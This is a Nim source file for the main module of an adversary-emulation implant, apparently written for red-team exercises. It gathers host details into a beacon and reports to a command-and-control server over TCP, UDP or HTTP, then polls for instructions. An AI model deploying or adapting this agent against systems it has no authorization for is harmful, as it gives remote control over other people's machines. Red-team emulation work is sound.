#[
    Author: Roger Johnston, Twitter: @VV_X_7
    License: GNU AGPLv3
]#
import tables
import strutils
import strformat
import random
import parseopt
import os
import net
import logging
from util/executors import determineExecutors, returnPlatform
from util/cli import writeHelp, writeVersion
from times import getTime, toUnix, nanosecond
from sockets/rawudp import udpCommunicate
from sockets/rawtcp import tcpCommunicate
from sockets/rawhttp import httpCommunicate
from sockets/contact import Contact, Beacon, Instruction, verifyAddress


var logger = newConsoleLogger()

# Modify this value on each compile for a unique hash.
let key = "Adversary Emulsion Total Landscaping"

proc pickName(chars: int): string =
    ## Generate a random name.
    ##
    let now = getTime()
    var r = initRand(now.toUnix * 1_000_000_000 + now.nanosecond)
    var letterBytes: string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for i in 1 .. chars:
        result = result & letterBytes[r.rand(len(letterBytes)-1)]

proc buildBeacon(name: string, group: string): contact.Beacon =
    ## Builds an agent beacon.
    ##
    ## hostOS and hostCPU are constants defined by the compiler.
    ## See: https://github.com/nim-lang/Nim/wiki/Consts-defined-by-the-compiler
    var pwd: string = os.getCurrentDir()
    var executable: string = os.getAppFilename()
    var links: seq[Instruction]
    result = Beacon(Name: name,
                    Location: executable,
                    Platform: returnPlatform(),
                    Executors: determineExecutors(),
                    Pwd: pwd,
                    Range: group,
                    Links: links)

proc communicate(contact: Contact, address: string, sleep: int, beacon: Beacon) =
    ## Executes the agent communication channel.
    ##
    if contact.protocol == "tcp":
        tcpCommunicate(contact = contact, sleep = sleep, beacon = beacon)
    elif contact.protocol == "udp":
        udpCommunicate(contact = contact, sleep = sleep, beacon = beacon)
    elif contact.protocol == "http":
        httpCommunicate(contact = contact, sleep = sleep, beacon = beacon)
    else:
        echo "Invalid contact."
        system.quit(0)

proc main() =
    var name: string = pickName(10)
    var contact: string = "tcp"
    var address: string = "127.0.0.1"
    var port: int = 2323
    var group: string = "red"
    var sleep: int = 5

    var p = initOptParser("", shortNoVal = {'h', 'v'}, longNoVal = @["help", "version"])
    while true:
        p.next()
        case p.kind
        of cmdEnd: break
        of cmdShortOption, cmdLongOption:
            case p.key
            of "help", "h": writeHelp()
            of "version", "v": writeVersion()
            of "name": name = p.val
            of "contact": contact = p.val
            of "address": address = p.val
            of "port": port = parseInt(string(p.val))
            of "range": group = p.val
            of "sleep": sleep = parseInt(string(p.val))
            else: writeHelp(); break
        of cmdArgument: writeHelp(); break

    # Initialize the communication channel.
    var agentContact = Contact(protocol: contact, address: address, port: port)

    if not verifyAddress(agentContact):
        echo "Invalid address."
        system.quit(0)

    logging.log(lvlInfo, fmt("[{contact}] agent at PID {os.getCurrentProcessId()} using key {key}"))

    # Initialize the agent beacon.
    var beacon: Beacon = buildBeacon(name=name, group=group)

    communicate(agentContact, address, sleep, beacon)

main()